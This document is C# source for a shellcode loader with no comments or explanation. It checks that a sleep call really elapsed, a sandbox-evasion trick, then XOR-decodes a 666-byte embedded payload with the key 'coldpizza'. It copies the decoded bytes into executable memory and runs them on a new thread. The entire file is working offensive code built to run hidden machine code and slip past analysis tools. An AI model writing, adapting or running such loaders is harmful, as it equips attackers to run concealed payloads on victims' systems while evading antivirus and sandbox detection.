using System;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            byte[] buf = new byte[666] { 0x9f, 0x27, 0xef, 0x80, 0x80, 0x81, 0xb6, 0x7a, 0x61, 0x63, 0x2e, 0x3d, 0x25, 0x20, 0x3b, 0x32, 0x4b, 0xb3, 0x06, 0x27, 0xe7, 0x36, 0x10, 0x38, 0x32, 0xf1, 0x33, 0x7b, 0x27, 0xe7, 0x36, 0x50, 0x3f, 0x37, 0x4b, 0xa8, 0x2b, 0xe4, 0x1e, 0x34, 0x38, 0x66, 0xcd, 0x30, 0x2b, 0x2b, 0x5e, 0xac, 0xc8, 0x4c, 0x08, 0x06, 0x78, 0x4d, 0x43, 0x2e, 0xad, 0xad, 0x7d, 0x28, 0x7b, 0xbb, 0x83, 0x8e, 0x3d, 0x24, 0xef, 0x22, 0x49, 0xf1, 0x38, 0x5d, 0x2b, 0x6e, 0xbc, 0x02, 0xf1, 0x11, 0x62, 0x71, 0x63, 0x22, 0x3e, 0x63, 0xe1, 0x02, 0x69, 0x7a, 0x7a, 0xea, 0xe3, 0xe7, 0x6c, 0x64, 0x70, 0x21, 0xff, 0xba, 0x15, 0x04, 0x27, 0x6d, 0xb4, 0x34, 0xe2, 0x3a, 0x5a, 0xea, 0x2b, 0x77, 0x25, 0x65, 0xa0, 0x39, 0x99, 0x2c, 0x29, 0x9c, 0xa6, 0x2d, 0xef, 0x44, 0xe1, 0x37, 0x4b, 0xa8, 0x2b, 0x6e, 0xba, 0x2c, 0x41, 0xa9, 0xd6, 0x3b, 0xa0, 0xaa, 0x62, 0x2d, 0x65, 0xb1, 0x51, 0x9a, 0x0f, 0x90, 0x2f, 0x6c, 0x20, 0x40, 0x78, 0x2c, 0x43, 0xab, 0x14, 0xbb, 0x37, 0x28, 0xef, 0x30, 0x4d, 0x33, 0x7b, 0xb1, 0x05, 0x2e, 0xe7, 0x68, 0x38, 0x2d, 0xf1, 0x3a, 0x7d, 0x2a, 0x6e, 0xbc, 0x25, 0xfb, 0x6d, 0xf2, 0x3b, 0x39, 0x2b, 0x6e, 0xbc, 0x25, 0x28, 0x37, 0x23, 0x20, 0x20, 0x3b, 0x2e, 0x35, 0x25, 0x2a, 0x21, 0xf9, 0x96, 0x41, 0x22, 0x3d, 0x93, 0x84, 0x28, 0x28, 0x23, 0x20, 0x29, 0xe8, 0x7d, 0x85, 0x2f, 0x8f, 0x96, 0x85, 0x27, 0x29, 0x52, 0xb4, 0x3f, 0x2d, 0xce, 0x1e, 0x13, 0x14, 0x08, 0x0d, 0x0a, 0x18, 0x64, 0x31, 0x3f, 0x32, 0xf3, 0x80, 0x2a, 0xa8, 0xae, 0x28, 0x07, 0x4f, 0x7d, 0x85, 0xb4, 0x30, 0x3c, 0x24, 0xed, 0x91, 0x3a, 0x20, 0x37, 0x50, 0xa3, 0x22, 0x5d, 0xad, 0x23, 0x3a, 0x33, 0xc0, 0x5b, 0x35, 0x16, 0xcb, 0x64, 0x70, 0x69, 0x7a, 0x85, 0xb4, 0x8b, 0x60, 0x6c, 0x64, 0x70, 0x58, 0x43, 0x48, 0x4f, 0x52, 0x59, 0x54, 0x4a, 0x44, 0x50, 0x54, 0x4b, 0x51, 0x5b, 0x6f, 0x36, 0x2c, 0xf9, 0xa8, 0x33, 0xbd, 0xa1, 0xd8, 0x6e, 0x6c, 0x64, 0x3d, 0x58, 0xb3, 0x29, 0x32, 0x09, 0x6c, 0x3f, 0x2d, 0xca, 0x3e, 0xf3, 0xe5, 0xa7, 0x63, 0x6f, 0x6c, 0x64, 0x8f, 0xbc, 0x92, 0x0a, 0x61, 0x63, 0x6f, 0x43, 0x15, 0x02, 0x27, 0x31, 0x17, 0x11, 0x1b, 0x03, 0x0f, 0x25, 0x1e, 0x30, 0x18, 0x0e, 0x0d, 0x10, 0x1a, 0x0b, 0x15, 0x36, 0x50, 0x2b, 0x2d, 0x08, 0x2c, 0x03, 0x2f, 0x25, 0x07, 0x0f, 0x2c, 0x1c, 0x38, 0x17, 0x3d, 0x3f, 0x2a, 0x01, 0x3f, 0x33, 0x4a, 0x15, 0x16, 0x19, 0x23, 0x3b, 0x27, 0x04, 0x29, 0x42, 0x28, 0x34, 0x0d, 0x36, 0x25, 0x49, 0x0e, 0x1c, 0x1f, 0x53, 0x00, 0x20, 0x5e, 0x34, 0x21, 0x13, 0x2e, 0x2b, 0x2c, 0x10, 0x56, 0x07, 0x50, 0x42, 0x44, 0x3c, 0x3f, 0x09, 0x50, 0x02, 0x58, 0x23, 0x25, 0x0c, 0x00, 0x49, 0x33, 0x28, 0x07, 0x1c, 0x15, 0x3a, 0x30, 0x22, 0x1e, 0x58, 0x30, 0x15, 0x14, 0x34, 0x16, 0x0b, 0x25, 0x1b, 0x54, 0x12, 0x5e, 0x0a, 0x0d, 0x13, 0x69, 0x32, 0xf3, 0xa0, 0x30, 0x35, 0x2d, 0x3c, 0x3d, 0x58, 0xb3, 0x29, 0x29, 0xdb, 0x6f, 0x5e, 0xcc, 0xf4, 0x69, 0x7a, 0x7a, 0x61, 0x33, 0x3c, 0x3f, 0x2d, 0xb7, 0xab, 0x91, 0x2f, 0x4f, 0x58, 0x90, 0xb9, 0x2c, 0xf9, 0xaf, 0x10, 0x70, 0x3e, 0x2b, 0xe6, 0x9d, 0x0e, 0x6f, 0x33, 0x28, 0x12, 0xe1, 0x50, 0x6f, 0x6c, 0x2d, 0xf9, 0x89, 0x10, 0x7e, 0x20, 0x3a, 0x26, 0xd6, 0x11, 0x36, 0xf7, 0xfc, 0x7a, 0x61, 0x63, 0x6f, 0x93, 0xb1, 0x3d, 0x58, 0xba, 0x29, 0x3b, 0x2b, 0xe6, 0x9d, 0x29, 0x41, 0xa0, 0x37, 0x4b, 0xa8, 0x30, 0x3c, 0x25, 0xa3, 0xb2, 0x44, 0x7c, 0x62, 0x1a, 0x9c, 0xba, 0xe9, 0xa4, 0x05, 0x76, 0x32, 0xbd, 0xa0, 0xeb, 0x7c, 0x6c, 0x64, 0x39, 0xd3, 0x3e, 0x8a, 0x54, 0x83, 0x6f, 0x6c, 0x64, 0x70, 0x96, 0xaf, 0x32, 0x9e, 0xac, 0x1b, 0x6e, 0x8f, 0xda, 0x81, 0x2f, 0x7a, 0x61, 0x63, 0x3c, 0x35, 0x0e, 0x30, 0x33, 0x33, 0xf3, 0xb0, 0xa2, 0x8d, 0x7c, 0x2d, 0xb7, 0xa9, 0x7a, 0x6a, 0x61, 0x63, 0x26, 0xd6, 0x3c, 0xd4, 0x3a, 0x9f, 0x7a, 0x61, 0x63, 0x6f, 0x93, 0xb1, 0x38, 0xfa, 0x29, 0x29, 0x29, 0xea, 0x88, 0x24, 0xed, 0x81, 0x21, 0xf3, 0xa0, 0x28, 0xa4, 0xaf, 0x6c, 0x44, 0x70, 0x69, 0x33, 0xf3, 0x98, 0x2a, 0xd5, 0x7e, 0xf2, 0xf9, 0x8b, 0x7a, 0x7a, 0x61, 0x63, 0x90, 0xb9, 0x2c, 0xf3, 0xad, 0x5a, 0xff, 0xa1, 0x17, 0xdd, 0x0a, 0xef, 0x77, 0x21, 0x7b, 0xb9, 0xe4, 0xa3, 0x1a, 0xbe, 0x3c, 0xb3, 0x31, 0x10, 0x7a, 0x38, 0x2a, 0xa8, 0xae, 0x94, 0xc5, 0xcb, 0x2c, 0x85, 0xb4 };

            string key = "coldpizza";
            for (int i = 0; i < buf.Length; ++i)
            {
                buf[i] = (byte)(buf[i] ^ key[i % key.Length]);
            }

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);

        }
    }
}
